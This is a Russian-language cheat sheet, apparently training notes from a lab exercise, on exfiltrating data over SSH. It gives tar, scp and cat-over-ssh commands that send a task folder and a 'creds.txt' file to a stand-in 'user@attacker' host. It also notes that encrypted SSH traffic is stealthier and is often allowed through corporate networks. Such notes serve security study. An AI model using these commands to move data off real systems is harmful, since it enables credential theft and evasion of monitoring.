# EXFILTRATION ЧЕРЕЗ SSH

## Суть

Использование SSH-клиента для передачи данных через зашифрованный канал. SSH обеспечивает шифрование трафика, что делает этот метод более скрытным по сравнению с сырым TCP.


## Основные способы

### 1. Через SSH с tar (без SCP)

Передача архива через SSH с распаковкой на стороне атакующего:

```bash
tar cf - task5/ | ssh user@attacker "cd /tmp/; tar xpf -"
```

**Разбор:**
- `tar cf - task5/` — создать архив и вывести в stdout
- `| ssh user@attacker` — передать через SSH
- `"cd /tmp/; tar xpf -"` — команда на атакующей машине: перейти в /tmp и распаковать архив

Преимущество: не требует SCP, использует только SSH-клиент.


### 2. Через SCP (Secure Copy Protocol)

Стандартный способ копирования файлов по SSH:

```bash
scp -r task5/ user@attacker:/tmp/
```

**Параметры:**
- `-r` — рекурсивное копирование (для папок)
- `user@attacker:/tmp/` — куда копировать

```bash
scp task5/creds.txt user@attacker:/tmp/creds.txt
```

Копирование одного файла.


### 3. SSH с перенаправлением вывода (альтернатива)

```bash
cat task5/creds.txt | ssh user@attacker "cat > /tmp/creds.txt"
```

Или сжатие на лету:

```bash
tar czf - task5/ | ssh user@attacker "tar xzf - -C /tmp/"
```

- `-C /tmp/` — распаковать в /tmp/


## Сравнение методов

| Метод | Команда | Когда использовать |
|-------|---------|-------------------|
| **SSH + tar** | `tar cf - dir \| ssh user@host "cd /tmp; tar xpf -"` | Нет SCP, нужна передача папки |
| **SCP** | `scp -r dir user@host:/tmp/` | Есть SCP, проще и быстрее |
| **SSH + cat** | `cat file \| ssh user@host "cat > /tmp/file"` | Только один файл |


## Преимущества SSH exfiltration

- **Шифрование** — данные защищены при передаче
- **Легитимность** — SSH-трафик часто разрешён в корпоративных сетях
- **Простота** — не требует дополнительных инструментов


## 🚀 Шпаргалка

```bash
# Передать папку через tar + SSH
tar cf - folder/ | ssh user@IP "cd /tmp; tar xpf -"

# Передать папку через SCP
scp -r folder/ user@IP:/tmp/

# Передать один файл через SCP
scp file.txt user@IP:/tmp/

# Передать файл через SSH + cat
cat file.txt | ssh user@IP "cat > /tmp/file.txt"

# Сжатие на лету + распаковка
tar czf - folder/ | ssh user@IP "tar xzf - -C /tmp/"
```
